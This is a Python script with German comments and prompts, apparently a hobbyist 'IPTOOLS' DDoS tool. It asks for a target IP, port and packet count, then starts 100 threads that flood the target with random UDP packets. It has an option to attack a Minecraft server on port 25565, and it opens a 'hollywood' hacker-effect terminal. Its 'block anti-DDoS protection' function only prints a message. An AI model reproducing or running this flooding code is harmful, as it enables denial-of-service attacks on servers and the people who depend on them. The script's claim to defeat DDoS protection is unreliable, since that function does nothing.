import os
import socket
import random
import threading
import subprocess

# Funktion für den DDoS-Angriff
def attack(target_ip, target_port=None, request_count=100):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    sent = 0
    while sent < request_count:
        port = target_port if target_port else random.randint(1, 65535)
        client.sendto(bytes, (target_ip, port))
        sent += 1
        print(f"Anfragen gesendet: {sent}")

# Funktion für das Blockieren von DDoS-Schutz
def block_ddos_protection(protection_ip):
    print(f"Blockiere Anti-DDoS-Mechanismen von {protection_ip}...")

# Funktion zur Ausführung von Hollywood
def run_hollywood():
    try:
        # Starte den Hollywood-Befehl in einem separaten Terminal
        subprocess.Popen(['xterm', '-e', 'hollywood'])
    except FileNotFoundError:
        print("Hollywood-Befehl nicht gefunden. Stelle sicher, dass Hollywood installiert ist.")

# Funktion für Minecraft Server DDoS
def minecraft_ddos(target_ip):
    print(f"Starte DDoS-Angriff auf Minecraft-Server {target_ip}...")
    attack(target_ip, 25565, 1000)  # Minecraft-Standardport

# Begrüßung
def print_welcome_message():
    print("""
██╗██████╗░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
██║██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
██║██████╔╝░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
██║██╔═══╝░░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
██║██║░░░░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
╚═╝╚═╝░░░░░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░
    """)

# Hauptprogramm für Benutzereingabe
if __name__ == "__main__":
    print_welcome_message()
    run_hollywood()
    
    target_ip = input("Gib die IP oder Domain des Ziels ein: ")
    target_port_input = input("Gib den Port des Ziels ein (optional, drücke Enter, um alle Ports zu verwenden): ")
    target_port = int(target_port_input) if target_port_input else None
    request_count = int(input("Wie viele Anfragen sollen gesendet werden? "))
    
    ddos_protection_ip = input("Gib die IP des Anti-DDoS-Schutzes ein, den du blockieren möchtest (falls zutreffend): ")
    
    # Starte das Blockieren von Anti-DDoS-Mechanismen
    if ddos_protection_ip:
        block_ddos_protection(ddos_protection_ip)

    # Minecraft Server DDoS Option
    minecraft_attack = input("Möchtest du auch einen Minecraft-Server angreifen? (ja/nein): ")
    if minecraft_attack.lower() == 'ja':
        minecraft_ddos(target_ip)
    
    # Starte den Angriff
    for _ in range(100):  # Anzahl der Threads
        thread = threading.Thread(target=attack, args=(target_ip, target_port, request_count))
        thread.start()
